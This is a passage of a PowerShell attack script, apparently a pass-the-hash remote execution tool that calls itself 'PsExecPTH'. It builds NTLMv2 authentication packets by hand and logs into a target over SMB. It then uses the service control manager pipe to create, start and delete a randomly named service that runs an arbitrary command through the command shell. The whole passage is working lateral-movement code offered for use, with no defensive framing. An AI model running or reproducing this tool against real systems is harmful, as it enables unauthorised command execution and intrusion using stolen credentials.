                            $auth_username_length +
                            $auth_username_offset +
                            $auth_hostname_length +
                            $auth_hostname_length +
                            $auth_hostname_offset +
                            0x00,0x00,0x00,0x00,0xc0,0x01,0x00,0x00, # session key
                            0x07,0x82,0x08,0xa2,
                            0x06,0x03,0x80,0x25,0x00,0x00,0x00,0x0f + # version
                            $NTLMv2_MIC + # not sure if this is correct
                            $auth_domain_bytes +
                            $auth_username_bytes +
                            $auth_hostname_bytes +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            $NTLMv2_response

    $full_security_blob_length = [BitConverter]::GetBytes($full_security_blob.Length + 16)
    $full_security_blob_length = $full_security_blob_length[0,1]
    $NTLMv2_response_length = [BitConverter]::GetBytes($full_security_blob.Length)
    $NTLMv2_response_length = $NTLMv2_response_length[1,0]
    $SMB_byte_count = [BitConverter]::GetBytes($full_security_blob.Length + 16 + 5)
    $SMB_byte_count = $SMB_byte_count[0,1]
    [Byte[]]$SMB_length_1 = [System.BitConverter]::GetBytes($full_security_blob.length + 12)
    $SMB_length_1 = $SMB_length_1[1,0]
    [Byte[]]$SMB_length_2 = [System.BitConverter]::GetBytes($full_security_blob.length + 8)
    $SMB_length_2 = $SMB_length_2[1,0]
    [Byte[]]$SMB_length_3 = [System.BitConverter]::GetBytes($full_security_blob.length + 4)
    $SMB_length_3 = $SMB_length_3[1,0]   
    $SMB_client_send = Set-PacketSMBSessionSetupAndXRequestNTLMSSPAuth $process_ID_bytes $SMB_user_ID 0x00,0x00 $full_security_blob_length $SMB_byte_count $SMB_length_1 $SMB_length_2 $SMB_length_3 $NTLMv2_response_length $full_security_blob
    $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
    $SMB_client_stream.Flush()
    $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

    if([System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00')
    {
        write-output "$Domain\$Username successfully authenticated on $Target"
        $login_successful = $true
    }
    else
    {
        write-output "$Domain\$Username failed to authenticate on $Target"
        $login_successful = $false
    }

    if($login_successful)
    {
        $SMB_path_bytes = 0x5c,0x5c + [System.Text.Encoding]::UTF8.GetBytes($Target) + 0x5c,0x49,0x50,0x43,0x24,0x00
        $SMB_path_byte_count = [System.BitConverter]::GetBytes($SMB_path_bytes.Length + 7)
        $SMB_path_byte_count = $SMB_path_byte_count[0,1]
        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
        $SMB_named_pipe_byte_count = 0x08,0x00
        $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
        $SMB_service = $SMB_service_random -replace "-00",""
        $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
        $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
        $SMB_service_random += '00-00-00'
        $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_referent_ID_bytes = [String](1..4 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $Command = "%COMSPEC% /C `"" + $Command + "`""
        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$PsExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $PsExec_command += '00-00'
        }
        else
        {
            $PsExec_command += '00-00-00-00'
        }    
        
        $PsExec_command_bytes = $PsExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $SMB_service_byte_count_bytes = [System.BitConverter]::GetBytes($PsExec_command_bytes.Length + $SMB_service_bytes.Length + 174)
        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0,1]   
        $PsExec_command_length_bytes = [System.BitConverter]::GetBytes($PsExec_command_bytes.Length / 2)
        $k = 0

        :SMB_execute_loop while ($k -lt 17)
        {

            switch ($k)
            {
            
                0
                {
                    $SMB_client_send = Set-PacketSMBTreeConnectAndXRequest $process_ID_bytes $SMB_user_ID 0x00,0x00 $SMB_path_byte_count $SMB_path_bytes
                }
                  
                1
                {
                    $SMB_client_send = Set-PacketSMBNTCreateAndXRequest $process_ID_bytes $SMB_user_ID 0x00,0x00 $SMB_named_pipe_byte_count $SMB_named_pipe_bytes
                }
                
                2
                {
                    $SMB_client_send = Set-PacketDCERPCBind $process_ID_bytes $SMB_user_ID 0x00,0x00
                }
               
                3
                {
                    $SMB_client_send = Set-PacketSMBNTReadAndXRequest $process_ID_bytes $SMB_user_ID 0x05,0x00
                }
                
                4
                {
                    $SMB_client_send = Set-PacketSMBOpenSCManagerW $process_ID_bytes $SMB_user_ID 0x05,0x00 $SMB_service_bytes                        
                }
                
                5
                {  
                    $SMB_client_send = Set-PacketSMBNTReadAndXRequest $process_ID_bytes $SMB_user_ID 0x06,0x00
                }
                
                6
                {
                    $SMB_client_send = Set-PacketSMBCreateServiceW $process_ID_bytes $SMB_user_ID 0x06,0x00 $SMB_service_byte_count_bytes $SMB_service_manager_context_handle $SMB_service_bytes $SMB_referent_ID_bytes $PsExec_command_length_bytes $PsExec_command_bytes                        
                }

                7
                {
                    $SMB_client_send = Set-PacketSMBNTReadAndXRequest $process_ID_bytes $SMB_user_ID 0x07,0x00
                }
 
                8
                {
                    $SMB_client_send = Set-PacketSMBStartServiceW $process_ID_bytes $SMB_user_ID 0x07,0x00 $SMB_service_context_handle
                }
                
                9
                {
                    $SMB_client_send = Set-PacketSMBNTReadAndXRequest $process_ID_bytes $SMB_user_ID 0x07,0x00
                }
                
                10
                { 
                    $SMB_client_send = Set-PacketSMBDeleteServiceW $process_ID_bytes $SMB_user_ID 0x07,0x00 $SMB_service_context_handle
                }

                11
                {
                    $SMB_client_send = Set-PacketSMBNTReadAndXRequest $process_ID_bytes $SMB_user_ID 0x07,0x00
                }

                12
                {
                    $SMB_client_send = Set-PacketSMBCloseServiceHandle $process_ID_bytes $SMB_user_ID 0x07,0x00 $SMB_service_context_handle
                }

                13
                {
                    $SMB_client_send = Set-PacketSMBCloseServiceHandle $process_ID_bytes $SMB_user_ID 0x07,0x00 $SMB_service_manager_context_handle
                }

                14
                {
                    $SMB_client_send = Set-PacketSMBCloseRequest $process_ID_bytes $SMB_user_ID 0x07,0x00
                }

                15
                {
                    $SMB_client_send = Set-PacketSMBTreeDisconnectRequest $process_ID_bytes $SMB_user_ID 0x07,0x00
                }

                16
                {
                    $SMB_client_send = Set-PacketSMBLogoffAndXRequest $process_ID_bytes $SMB_user_ID 0x07,0x00
                }

            }
            
            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
            $SMB_client_stream.Flush()
            
            if($k -eq 5) 
            {
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                $SMB_service_manager_context_handle = $SMB_client_receive[88..107]

                if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_service_manager_context_handle) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                {
                    Write-Output "$Domain\$Username is a local administrator on $Target"
                }
                elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')
                {
                    Write-Output "$Domain\$Username is not a local administrator on $Target"
                    $PsExec_failed = $true
                }
                else
                {
                    Write-Output "Something went wrong"
                    $PsExec_failed = $true
                }

            }
            elseif($k -eq 7 -or $k -eq 9 -or $k -eq 11)
            {
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                switch($k)
                {

                    7
                    {
                        $SMB_service_context_handle = $SMB_client_receive[92..111]
                        $SMB_execute_error_message = "Service creation fault context mismatch"
                    }

                    11
                    {
                        $SMB_execute_error_message = "Service start fault context mismatch"
                    }

                    13
                    {
                        $SMB_execute_error_message = "Service deletion fault context mismatch"
                    }

                }
                
                if([System.BitConverter]::ToString($SMB_service_context_handle[0..3]) -ne '00-00-00-00')
                {
                    Write-Output "Something went wrong"
                    $PsExec_failed = $true
                }

                if([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '1a-00-00-1c')
                {
                    Write-Output "$SMB_execute_error_message service on $Target"
                    $PsExec_failed = $true
                }

            }        
            else
            {
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null 
            }
            
            if(!$PsExec_failed -and $k -eq 7)
            {
                Write-Output "PsExecPTH service $SMB_service created on $Target"
                Write-Output "Trying to execute command on $Target"
            }
            elseif(!$PsExec_failed -and $k -eq 9)
            {
                Write-Output "PeExecPTH command likely executed on $Target"
            }
            elseif(!$PsExec_failed -and $k -eq 11)
            {
                Write-Output "PsExecPTH service $SMB_service deleted on $Target"
            }
            
            if($PsExec_failed)
            {
                Write-Output "PsExecPTH failed on $Target"
                BREAK SMB_execute_loop
            }

            $k++
        }

    }

    $SMB_client.Close()
}

}